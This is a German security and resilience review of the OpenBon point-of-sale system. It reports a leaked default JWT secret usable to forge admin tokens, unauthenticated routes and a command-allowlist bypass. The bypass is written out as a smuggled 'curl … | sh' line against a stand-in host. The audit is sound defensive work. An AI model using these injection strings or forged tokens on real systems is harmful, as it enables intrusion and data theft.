# OpenBon – Nachprüfung und Empfehlungen (Stand 2)

Stand: 2026-08-25 · Reine Analyse, **keine Codeänderungen vorgenommen**
Vorgänger: `EMPFEHLUNGEN.md` (Stand 1)

Geprüft wurde der aktuelle Stand aus dem Projektordner: 168 Dateien, 58 API-Routen.
`tsc --noEmit` läuft nach `npm install` fehlerfrei durch (die neuen Abhängigkeiten `jose` und `zod`
sind in `package.json`, waren aber noch nicht installiert). Die Testfehler in meiner Umgebung
kommen ausschließlich von der fehlenden Prisma-Engine für Linux – auf deinem Rechner und in der
CI (die vorher `prisma db push` ausführt) sollten sie durchlaufen.

---

## 1. Zusammenfassung

Es ist enorm viel passiert – deutlich mehr als das, was ich vorgeschlagen hatte. Middleware mit
JWT-Session, Zod-Schemata, Rate-Limiter, strukturiertes Logging, Health- und Metrics-Endpunkte,
CI-Pipeline, 23 Datenbank-Indizes, DSFinV-K- und DATEV-Export, Personalverwaltung mit
Trinkgeldprofilen, Gastbestellung per QR, digitaler Beleg, Kundendisplay, Zapfhahn-Verwaltung,
Wertmarken, Veranstaltungsvorlagen, konfigurierbare Auswahllisten, CSV-Import.

**Aber:** Die Absicherung ist an entscheidenden Stellen nur halb angeschlossen, und drei der
wichtigsten neuen Resilienz-Bausteine sind geschriebener, aber **toter Code**. Das ist die
gefährlichste Sorte Fortschritt, weil das System nach außen abgesichert und ausfallsicher *aussieht*.

### Erledigt gegenüber Stand 1

| Punkt | Status |
|---|---|
| Middleware und JWT-Session | eingeführt (`src/middleware.ts`, `src/lib/auth-session.ts`) |
| Fail-Open bei DB-Fehler in der PIN-Prüfung | **behoben** – `auth-pin.ts:54-58` gibt jetzt `false` zurück |
| Timing-sicherer PIN-Vergleich | **behoben** – `auth-pin.ts:9-14` nutzt `crypto.timingSafeEqual` |
| Abholmarken-Bug an der Theke | **behoben** – `orders/route.ts:66-71` normalisiert `DIRECT_SALE` → `COUNTER_DIRECT` |
| Doppelter Bestandsabzug | **behoben** im Kellnerpfad – `orders/route.ts:166-171` bucht nur noch `StockItem` |
| Transaktionsklammer im Bestellpfad | **behoben** – `orders/route.ts:93-233` ist eine `$transaction` |
| Fehlende Indizes | **behoben** – 23 `@@index` im Schema |
| CI-Pipeline | **vorhanden** – `.github/workflows/ci.yml` mit Typecheck, Tests und Build |
| Zod-Validierung | Grundlage vorhanden (`src/lib/validations/schemas.ts`) |
| Konfigurierbare Listen, CSV-Import, Vorlagen, Personal | **umgesetzt** |

---

## 2. Die drei Attrappen

Das sind die Punkte, die ich am dringendsten empfehle, **bevor** neue Funktionen dazukommen.
Alle drei sehen im Code fertig aus, sind aber nirgends angeschlossen.

### 2.1 Die Outbox wird von keinem einzigen Screen benutzt

`src/lib/offline/outbox.ts` (184 Zeilen) wird **von keiner Datei importiert**.
Die Bedienoberflächen senden weiterhin direkt:

- `waiter/order/page.tsx:371` – `fetch('/api/orders')`, im `catch` nur eine Meldung. Die Bestellung ist weg.
- `pos/page.tsx:268` und `:293` – zwei sequenzielle Requests ohne Klammer. Bricht das Netz dazwischen,
  existiert eine Bestellung mit Bestandsabzug, aber ohne Zahlung.
- `waiter/payment/page.tsx:355` – sendet immerhin `requestId`, aber ohne Outbox.

**Und: Kein Client sendet einen Idempotency-Key.** Die serverseitige Idempotenz
(`orders/route.ts:51-64`, Modell `IdempotencyKey` im Schema) ist vollständig implementiert und
läuft im Betrieb komplett leer. Ein Kellner, der bei Timeout erneut auf „Senden" tippt, erzeugt
weiterhin eine echte Doppelbestellung inklusive doppeltem Bestandsabzug.

Zwei Fehler stecken zusätzlich in der Outbox selbst, falls sie angeschlossen wird:
`outbox.ts:47` und `:50` erzeugen **zwei verschiedene** Zufallsschlüssel (einer geht als Header,
einer in den Body – beim Retry passen sie nicht zusammen), und `outbox.ts:148-155` zählt
`attempts` nur im Speicher hoch, ohne es zurückzuschreiben. Es gibt kein Versuchslimit und kein
Backoff: ein dauerhaft mit 400 abgelehnter Eintrag wird bei jedem `online`-Ereignis endlos erneut gesendet.

### 2.2 Der Service Worker installiert sich nie

`public/sw.js:3-8` präcacht `/favicon.ico`. Diese Datei existiert nicht – weder in `public/`
noch in `src/app/`. `cache.addAll()` bricht bei **einer** fehlschlagenden Antwort komplett ab,
`event.waitUntil` schlägt fehl, der Service Worker wird verworfen. Der `.catch(function(){})`
in `layout.tsx:75` verschluckt das stillschweigend.

**Ein Einzeiler entscheidet also darüber, ob die gesamte PWA-Schicht existiert oder nicht.**

Selbst nach dem Fix wäre die Bestellmaske offline nicht nutzbar: `sw.js:38` schließt alle
`/api/`-Requests vom Caching aus, die Maske lädt ihre Produktliste aber genau daher
(`waiter/order/page.tsx:108,120,159,179`). Und der Offline-Fallback `sw.js:69` liefert für jede
Navigation die Startseite, nicht `/waiter/order`.

### 2.3 Es läuft kein einziges automatisches Backup

`startAutoBackupScheduler()` (`backup-scheduler.ts:54`) hat **null Aufrufer**. Weder `server.js`
noch eine Route noch eine `instrumentation.ts` ruft ihn auf.

Die Umsetzung hätte darüber hinaus vier Fehler:

- `backup-scheduler.ts:18` berechnet `timestampBackupPath`, verwendet die Variable aber nie –
  es wird nie eine zeitgestempelte Sicherung geschrieben. Der Rotationsblock `:36-45` sucht genau
  nach diesem Präfix und findet immer null Dateien. Es gäbe also **genau eine** Sicherung.
- `:23-25` löscht die vorhandene Sicherung, **bevor** `VACUUM INTO` läuft. Stirbt der Pi in diesem
  Fenster, gibt es gar keine mehr.
- Der Fallback `:29-32` kopiert `dev.db` ohne die `-wal`- und `-shm`-Dateien. Da `db.ts:22` WAL
  aktiviert, fehlen in dieser Kopie die letzten Transaktionen.
- Das Ziel `prisma/backups` liegt auf **derselben SD-Karte** wie die Datenbank. Der häufigste
  Pi-Ausfall ist genau der SD-Defekt – dann sind beide gleichzeitig weg.

Positiv: `VACUUM INTO` ist die richtige, WAL-sichere Methode. Der Baustein ist gut gewählt,
nur nicht verdrahtet.

### 2.4 Zugabe: Die Spooler-Wiederherstellung ist ebenfalls eine Attrappe

`recoverPendingJobs()` (`network-spooler.ts:233-247`) lädt die offenen Druckaufträge aus der
Datenbank und macht damit dann **nur ein `console.log`**. Kein `queue.push`, kein `processQueue()`.

Es wäre auch gar nicht möglich: Das Schema hat `PrintJob.rawPayload`, aber `printTicket`
(`network-spooler.ts:37-47`) schreibt dieses Feld beim Anlegen nicht. Der Bon-Inhalt existiert nur
im Arbeitsspeicher.

Und `printStatus` wird weiterhin zu früh gesetzt: `ticket-splitter.ts:141` sammelt die IDs bereits
beim Routing, der Rückgabewert von `printTicket` wird nicht ausgewertet, `orders/route.ts:273`
setzt daraufhin `PRINTED`. **Ein Bon, der nie gedruckt wurde, steht in der Datenbank als gedruckt** –
und die Selbstdiagnose, die nach `PENDING` sucht (`diagnostics.ts:203`), findet konstruktionsbedingt nie etwas.

---

## 3. Neue und verbliebene Sicherheitslücken

### 3.1 `SESSION_SECRET` ist nirgends gesetzt – die Middleware ist damit wirkungslos

`auth-session.ts:17` fällt auf `DEFAULT_SECRET = 'openbon-jwt-super-secret-key-32-chars-min-2026'`
zurück. Dieses Secret steht in `.env` nicht, in `.env.example` nicht, im `Dockerfile` nicht, in
`docker-compose.yml` nicht, in `install-headless.sh` nicht und in der CI nicht. Es gibt also
**keinen Pfad, auf dem eine Installation je ein eigenes Secret bekommt.**

Bei einem öffentlichen Repository kann jeder mit dem bekannten Secret selbst ein gültiges
`{"role":"ADMIN"}`-Token signieren und als Cookie oder `Bearer` schicken. Die komplette Middleware
inklusive `/admin`, `/api/backup`, `/api/fiscal` und `/api/config` ist damit umgangen.

Dasselbe Muster in `digital-receipt.ts:11` (`LICENSE_HMAC_SECRET`) und `fiscal.ts` (Fiskalblock-Salt).

**Das ist der wichtigste Einzelpunkt dieses Dokuments.** Empfehlung: Fallback entfernen, beim
Start hart abbrechen wenn `SESSION_SECRET` fehlt, und im Installer per `openssl rand -hex 32`
automatisch erzeugen.

### 3.2 Der Middleware-Matcher deckt 8 von 58 Routen ab

`middleware.ts:74-81` schützt nur `/admin/*`, `/api/system/*`, `/api/backup/*`, `/api/fiscal/*`
und `/api/config*`. **Weiterhin völlig offen und schreibend erreichbar sind unter anderem:**

| Route | Was ein Fremder im WLAN damit tun kann |
|---|---|
| `/api/payments` POST | Zahlungen fingieren |
| `/api/orders/[id]/void` | stornieren – der 403 dort ist eine „bereits kassiert"-Prüfung, keine Auth |
| `/api/reports/z-bon` POST | den Tagesabschluss auslösen |
| `/api/waiters` GET | **alle Kellner-PINs im Klartext auslesen** (`WaiterProfile.pin` ist im Select) |
| `/api/waiters` POST | eigenen Kellner mit selbstgewählter PIN anlegen → Login-Bypass |
| `/api/products/csv` POST | die komplette Preisliste überschreiben |
| `/api/profiles` POST | den Systemzustand aus einer Vorlage überschreiben |
| `/api/diagnostics` POST | Druckerflut über `PRINT_TEST_TICKETS` – ungeschütztes Duplikat zum geschützten `/api/system/diagnostics` |
| `/api/sync/pull` | das komplette Transaktionsjournal abziehen |
| `/api/metrics`, `/api/logs` | Tagesumsatz und Protokolle lesen |
| `/api/tables`, `/api/inventory`, `/api/tokens` | Tische löschen, Bestände und Wertmarken manipulieren |

Empfehlung: Matcher auf `/api/:path*` umstellen und eine **Allowlist der öffentlichen Routen**
pflegen statt einer Denylist der geschützten. Rollen pro Pfadpräfix in einer Tabelle.
Genau eine Stelle, die entscheidet.

### 3.3 Der digitale Beleg gibt alle Belege preis

`api/receipt/[code]/route.ts:8-13` sucht mit
`OR: [{ digitalReceiptCode: code }, { invoiceNumber: code }]`.

Der `digitalReceiptCode` selbst ist ausreichend zufällig (64 Bit). Der zweite Zweig aber nicht:
`invoiceNumber` ist ein fortlaufender Zähler. Wer `/api/receipt/BELEG-2026-00001`, `00002`, `00003`
durchzählt, bekommt jeden Beleg des Betriebs – mit allen Positionen, Beträgen, Trinkgeld, Zahlart,
Kellnername und Tisch. Faktisch ein vollständiger Umsatz-Dump über eine unauthentifizierte GET-Route.

Empfehlung: den `invoiceNumber`-Zweig entfernen und die Antwort auf die Belegfelder reduzieren
(derzeit werden auch `tseProvider` und `tseSerialNumber` mitgeliefert).

### 3.4 Die Befehls-Allowlist ist umgehbar

`api/system/update/route.ts:169` prüft
`ALLOWED_COMMANDS.some((cmd) => trimmed === cmd || trimmed.startsWith(cmd))`.

`startsWith` erlaubt Anhängsel. `git status && curl http://böse/x | sh` beginnt mit `git status`,
besteht die Prüfung und geht anschließend an `exec`, das eine Shell startet. Die Allowlist ist damit
wirkungslos. (Immerhin liegt die Route jetzt hinter der Middleware – aber nur so lange 3.1 nicht gilt.)

Empfehlung: nur exakte Gleichheit erlauben, und `execFile` mit Argumentliste statt `exec` mit Shell.

### 3.5 Die Gastbestellung ist praktisch ungeschützt

`api/guest/orders/route.ts:26` lautet sinngemäß
„wenn Tisch-Token gesetzt **und** Anfrage-Token gesetzt **und** ungleich → ablehnen".
Lässt man den Token im Body einfach **weg**, entfällt die Prüfung. Damit ist jeder Tisch über seine
fortlaufende Nummer bestellbar, ohne je einen QR-Code gesehen zu haben.

Kein Rate-Limit, keine Mengen- oder Betragsobergrenze. Jeder Request löst Sequenz-Increment,
Bestandsabzug und **automatischen Küchendruck** aus. Ein Skript kann Papier, Lagerbestand und
Tischplan binnen Sekunden ruinieren.

Zusätzlich bucht diese Route den Bestand auf `Product.stockQuantity`, während der Kellnerpfad
inzwischen `StockItem.currentQuantity` verwendet – **zwei verschiedene Felder**. Dadurch ist auch
die Ausverkauft-Warnung an der Theke (`pos/page.tsx:202`) tot, weil sie den Wert liest, den reguläre
Bestellungen nicht mehr verändern.

### 3.6 Socket.io ist weiterhin völlig unauthentifiziert

`server.js:48` – kein `io.use()`-Handshake. Die Rolle kommt ungeprüft aus dem Client-Payload
(`server.js:54`), ein Client kann sich also als `ADMIN` registrieren und tritt dem `admin_room` bei.
`device:force_logout` (`server.js:105`) erlaubt jedem, jedes Gerät auszuwerfen. Dazu gefälschte
Bestellungen, Chat-Nachrichten, Bestandsänderungen und – neu – Manipulation des gastseitigen
Kundendisplays über `pos:cart_updated`.

### 3.7 Der Rate-Limiter ist umgehbar

`auth/pin/route.ts:18` bildet den Schlüssel aus `IP : deviceId : stationType`, wobei `deviceId`
**aus dem Request-Body** stammt. Ein Angreifer variiert einfach die `deviceId` pro Versuch und
umgeht das Limit vollständig. `x-forwarded-for` ist ohnehin fälschbar.

`action: 'CHANGE'` (`auth/pin/route.ts:93`) läuft ganz ohne Limit – dort ist der Admin-PIN
unbegrenzt durchprobierbar, und ein Treffer setzt sofort einen neuen.

Der Speicher ist prozesslokal und ohne Aufräumintervall; er übersteht keinen Neustart.

### 3.8 PINs liegen weiterhin im Klartext

`EventConfig.adminPin` und `WaiterProfile.pin` sind unverschlüsselte Spalten. `/api/config` GET
liefert sie (immerhin jetzt nur an Admins), `/api/waiters` GET an jeden.
Die Kellner-PIN-Prüfung sucht per `findFirst({ where: { pin: cleanPin } })` – das funktioniert
nur mit Klartext und lässt sich nicht ohne Umbau hashen. Empfehlung: PIN-Hash je Kellner speichern
und beim Login über die aktiven Kellner iterieren (bei realistisch unter 50 Personen unproblematisch).

---

## 4. Ausfallsicherheit – Alternativen

Das war die ausdrückliche Frage. Zuerst die Ausgangslage, dann die Optionen.

### 4.1 Wie sicher ist es heute wirklich

Der HA-Standby ist gegenüber Stand 1 **kaum besser**:

| Mangel | Status |
|---|---|
| Watcher startet nicht zuverlässig | teilweise – er startet nur, weil `server.js:202` nach vier Sekunden zufällig einen Diagnose-Endpunkt per HTTP aufruft und damit das Modul lädt. Fragil und nicht beabsichtigt |
| Positionen werden nicht repliziert | **weiterhin offen** – `ha-service.ts:175-213` legt Bestellungen und Zahlungen ohne `items` an |
| Sequenzen werden nicht repliziert | **weiterhin offen** – nach dem Failover beginnt die Belegnummerierung von vorn, und `invoiceNumber @unique` lässt die ersten Zahlungen scheitern |
| Split-Brain | **weiterhin offen** – 6 Sekunden Netzhänger genügen für die Promotion, kein Fencing, kein Rückweg |
| Journal-Kürzung ohne Rücksicht auf den Standby | **weiterhin offen** – `diagnostics.ts:254` löscht alles außer den letzten 5000 Einträgen, ohne den Replikationsstand zu kennen. Die entstehende Lücke wird nicht erkannt |

**Konkret, wenn der Server-Pi während des Fests ausfällt:** Alle Tablets zeigen Verbindungsfehler,
nach dem nächsten Neuladen eine weiße Seite. Alle Bons in der Spooler-Warteschlange sind weg, und es
gibt keine Liste dessen, was nicht gedruckt wurde, weil sie fälschlich als `PRINTED` markiert sind.
Es existiert kein automatisches Backup. Ein Standby promotet sich mit Bestellungen ohne Positionen
und zurückgesetzten Belegnummern – praktisch nicht betriebsfähig.

**Wenn nur das WLAN zehn Minuten weg ist:** Server und kabelgebundene Drucker laufen weiter,
die Tablets sind tot. Zehn Minuten Bestellungen sind verloren, und die Wiederholungsversuche
erzeugen Doppelbestellungen.

### 4.2 Die richtige Frage zuerst

Bevor man Technik wählt, sollten zwei Zahlen festgelegt werden:

- **RPO** – wie viele Daten dürfen im Ernstfall verloren gehen? Für eine Kasse: **null Bestellungen.**
- **RTO** – wie lange darf der Ausfall dauern? Für ein Vereinsfest sind **5 bis 10 Minuten** völlig
  akzeptabel, *wenn* in dieser Zeit weiter bestellt werden kann.

Aus diesen beiden Zahlen folgt fast alles. Ein RTO von 10 Minuten braucht **kein** automatisches
Failover. Ein RPO von null braucht **zwingend** offline-fähige Clients und kontinuierliche Sicherung.

Und die tatsächliche Ausfallreihenfolge auf einem Fest ist:

```
WLAN-Störung  ≫  Druckerproblem  >  SD-Karten-Defekt  >  Stromausfall  >  Softwareabsturz
   (häufig)        (häufig)          (selten)            (selten)         (selten)
```

Das automatische Zwei-Pi-Failover adressiert nur die beiden seltensten Fälle – und fügt mit
Split-Brain ein neues, wahrscheinlicheres Risiko hinzu. **Das ist der Grund, warum ich davon abrate.**

### 4.3 Option A – Offline-First-Clients (klare Empfehlung, Basis für alles andere)

Die Ausfallsicherheit wandert vom Server in die Endgeräte. Jedes Tablet hält seinen Warenkorb und
eine Sendewarteschlange lokal (IndexedDB) und arbeitet weiter, egal was der Server macht.

- Deckt ab: WLAN-Störung, Serverneustart, kurzer Serverausfall, Softwareabsturz – also die häufigsten Fälle
- RPO: null · RTO: für den Kellner faktisch null, er merkt nichts
- Aufwand: gering, **weil 80 % schon geschrieben sind** – Outbox und Service Worker müssen nur
  angeschlossen und die vier genannten Fehler behoben werden
- Kosten: keine

Nötig: `sw.js:7` Favicon-Eintrag entfernen, Outbox in den drei Screens verdrahten, Idempotency-Key
in Header und Body erzeugen, Produktkatalog und Tischliste lokal cachen (die ändern sich während des
Fests kaum), Offline-Banner mit Anzahl wartender Vorgänge.

**Das ist die mit Abstand wirksamste Einzelmaßnahme.** Nichts sonst in dieser Liste hat ein
vergleichbares Verhältnis von Aufwand zu Wirkung.

### 4.4 Option B – Litestream statt selbstgebautem Sync-Journal

[Litestream](https://litestream.io) repliziert die SQLite-WAL kontinuierlich auf ein zweites Ziel –
USB-Stick, Netzlaufwerk, zweiter Pi oder MinIO. Wiederherstellung auf einen beliebigen Zeitpunkt
mit `litestream restore`.

- Deckt ab: SD-Defekt, Stromausfall, Datenkorruption, versehentliches Löschen
- RPO: unter einer Sekunde · RTO: so lange die Wiederherstellung dauert, typisch 1 bis 3 Minuten
- Aufwand: **keine Codeänderung**, eine systemd-Unit und eine Konfigurationsdatei
- Kosten: ein USB-Stick

Litestream löst das Replikationsproblem sauberer, als es das handgeschriebene `SyncJournal` je tun
wird – es arbeitet unterhalb der Anwendung, kennt keine vergessenen Modelle, keine nicht
replizierten Positionen und keine Sequenzprobleme. Ich würde das `SyncJournal` als
Replikationsmechanismus dann **ersatzlos streichen** und nur noch als Änderungsprotokoll behalten.

### 4.5 Option C – Kalt-Standby mit dokumentiertem Handumschalten

Zweiter Pi mit identischem Image, ausgeschaltet oder als reiner Zuschauer laufend. Im Ernstfall:
einschalten, letzte Litestream-Sicherung einspielen, IP übernehmen, fertig.

- Deckt ab: Totalausfall der Hardware
- RTO: 3 bis 5 Minuten, wenn es vorher einmal geübt wurde
- Aufwand: gering – eine Checkliste und ein zweites Gerät
- Kein Split-Brain möglich, weil ein Mensch entscheidet

In Kombination mit Option A merkt der Kellner von diesen fünf Minuten praktisch nichts, weil seine
Bestellungen in der Outbox liegen und danach automatisch nachlaufen.

**Diese Kombination – A + B + C – ist meine Empfehlung für ein Vereinsfest.**

### 4.6 Option D – Automatisches Failover, aber richtig

Falls automatisches Umschalten eine harte Anforderung bleibt, dann nicht selbstgebaut:

- **keepalived** mit einer virtuellen IP statt mDNS-Umschaltung. Die Tablets sprechen immer dieselbe
  Adresse an, der Wechsel ist für sie unsichtbar
- **Ein dritter Zeuge** (Quorum) – ein Raspberry Pi Zero oder ein Tablet, das mit abstimmt.
  Ohne Zeugen ist Split-Brain bei zwei Knoten prinzipiell nicht lösbar
- **Fencing:** Der neue Primary muss den alten nachweislich abschalten können, sonst darf er nicht
  übernehmen
- Umstieg auf **PostgreSQL mit Streaming-Replikation**, weil SQLite für synchrone Replikation nicht
  gebaut ist

Aufwand: hoch, Nutzen für ein Vereinsfest gering. Ich würde es nur bauen, wenn OpenBon in größeren
Gastronomiebetrieben mit Dauerbetrieb eingesetzt werden soll – dann aber gleich richtig.

### 4.7 Option E – Die Hardware-Ebene (bester Ertrag pro Euro)

Am meisten Ausfallsicherheit bekommt man hier, nicht im Code:

| Maßnahme | Verhindert | Kosten |
|---|---|---|
| **USB-SSD statt SD-Karte** | den mit Abstand häufigsten Pi-Totalausfall | ca. 25 € |
| **USV / Powerbank mit Durchladung** | Datenverlust bei Stromausfall, korrupte SQLite | ca. 40 € |
| **Drucker per LAN statt WLAN** | Druckausfälle bei Funkstörung – der häufigste Störfall überhaupt | Kabel |
| **Zweiter Access Point, andere Kanäle** | WLAN-Überlastung bei vollem Zelt | ca. 60 € |
| **Rootfs read-only mit overlayfs** | Dateisystemschäden bei hartem Ausschalten | kostenlos |
| **`synchronous = FULL` statt `NORMAL`** (`db.ts:24`) | Verlust der letzten Transaktionen bei Stromverlust | minimal langsamer |

Die letzte Zeile ist ein Einzeiler mit spürbarer Wirkung: aktuell kann ein hartes Ausstecken die
zuletzt bestätigten Buchungen kosten.

### 4.8 Option F – Der Notbetrieb, den niemand plant

Unabhängig von aller Technik gehört ein dokumentierter Papierfallback dazu: vorgedruckte
Notblöcke an jeder Station, eine klare Regel wer wann umstellt, und ein Weg, die Notzettel
hinterher nachzubuchen (z. B. ein „Nacherfassung"-Modus mit abweichendem Zeitstempel).

Das kostet einen Nachmittag und ist die einzige Maßnahme, die auch dann noch trägt, wenn alles
andere gleichzeitig ausfällt. Für den Z-Bon und die Kassenprüfung ist die Nacherfassung ohnehin
nötig – besser vorbereitet als improvisiert.

### 4.9 Empfohlene Zielarchitektur

```
   Tablets (PWA, Outbox in IndexedDB)          ← arbeiten weiter, wenn alles andere ausfällt
        │  WLAN (2 Access Points)
        ▼
   Pi 5 · USB-SSD · USV            ── LAN ──►  Bondrucker (kabelgebunden)
        │
        ├── Litestream ──► USB-Stick am Gerät       (RPO < 1 s)
        └── Litestream ──► zweiter Pi / NAS          (RPO < 1 s, off-device)

   Zweiter Pi: identisches Image, ausgeschaltet.
   Im Ernstfall: einschalten, restore, IP übernehmen  (RTO 3–5 min)
```

Kein automatisches Failover, kein Split-Brain, kein selbstgebautes Replikationsprotokoll –
und trotzdem RPO nahe null bei einem RTO, das im Festbetrieb niemand bemerkt.

---

## 5. Was ich sonst noch empfehle

### 5.1 Bestandsführung endgültig vereinheitlichen

Der Kellnerpfad bucht jetzt `StockItem.currentQuantity`, aber `guest/orders/route.ts:62`,
`inventory/route.ts` und `procurement/route.ts` arbeiten weiterhin mit `Product.stockQuantity`.
Die Ausverkauft-Warnung an der Theke liest den toten Wert. Solange zwei Felder existieren, wird
das immer wieder auseinanderlaufen – eines davon gehört gelöscht.

### 5.2 Idempotenz scharf schalten

Die Prüfung in `orders/route.ts:55` liegt außerhalb der Transaktion. Zwei parallele Wiederholungen
passieren sie beide; die zweite scheitert am Unique-Constraint und liefert **HTTP 400 mit
Prisma-Fehlertext** statt den ursprünglichen Beleg zurückzugeben. Die Prüfung gehört in die
Transaktion, und `payments/route.ts:94` sollte statt der `LIKE`-Suche über die Rechnungsnummer
ebenfalls die `IdempotencyKey`-Tabelle verwenden.

Dazu fehlt eine Aufräumung: `responseJson` speichert die komplette Bestellung inklusive Positionen
und wächst unbegrenzt auf der SD-Karte.

### 5.3 Kleinigkeiten mit unangenehmer Wirkung

- `Order.orderNumber` hat kein `@unique` (`schema.prisma:249`). Doppelte Bonnummern werden nicht abgefangen.
- `/api/sync/heartbeat` gibt weiterhin statisch `HEALTHY` zurück, ohne die Datenbank anzufassen –
  im Gegensatz zum neuen, richtigen `/api/health`. Die HA-Anzeige in der Navbar liest ein Feld,
  das dieser Endpunkt nicht liefert.
- `/api/diagnostics` ist ein ungeschütztes Duplikat von `/api/system/diagnostics`. Eines davon sollte weg.
- Der HA-Service verschluckt jeden Replikationsfehler stumm (`ha-service.ts:150,215`). Ein Standby,
  der seit Stunden nichts mehr repliziert, sieht von außen gesund aus.

### 5.4 Vorgeschlagene Reihenfolge

**Sofort, vor allem anderen (ein Tag)**
`SESSION_SECRET` erzwingen und im Installer erzeugen · Middleware-Matcher auf `/api/:path*`
umstellen · `invoiceNumber`-Zweig im Belegabruf entfernen · PIN aus der Kellnerliste entfernen ·
Allowlist auf exakte Gleichheit · Gastbestellung: Token verpflichtend

**Diese Woche (zwei bis drei Tage)**
Service-Worker-Favicon · Outbox anschließen inklusive Idempotency-Key · Backup-Scheduler starten
und die vier Fehler beheben · Spooler-Wiederherstellung und `printStatus` korrigieren ·
Socket.io-Handshake · Rate-Limiter-Schlüssel korrigieren

**Danach**
Litestream einrichten · Bestandsfelder vereinheitlichen · HA entweder ersetzen oder als
experimentell kennzeichnen · Notbetrieb dokumentieren und einmal proben · Hardware-Maßnahmen

---

## 6. Einordnung

Der Funktionsumfang ist inzwischen bemerkenswert – DSFinV-K- und DATEV-Export, Gastbestellung,
digitaler Beleg, Trinkgeldprofile, Zapfhähne, Wertmarken und Veranstaltungsvorlagen sind Dinge,
die kommerzielle Systeme in dieser Preisklasse nicht selbstverständlich mitbringen.

Das Risiko liegt gerade woanders: Es wird schneller neue Funktionalität gebaut, als die bestehende
verdrahtet wird. Outbox, Service Worker, Backup-Scheduler und Spooler-Wiederherstellung sind vier
Bausteine, die vollständig geschrieben, aber nicht angeschlossen sind – und die alle vier genau die
Dinge betreffen, auf die man sich im Ernstfall verlässt.

Ich würde deshalb dringend empfehlen, vor der nächsten Funktion einen Durchgang zu machen, der
**nichts Neues baut, sondern nur Vorhandenes fertig verdrahtet und prüft**. Ein Integrationstest,
der einen kompletten Vorgang durchspielt – bestellen, splitten, kassieren, stornieren, Z-Bon –
und je ein bewusst herbeigeführter Ausfall (Netz weg, Drucker aus, Server neu starten) würden
alle vier Attrappen sofort sichtbar machen.
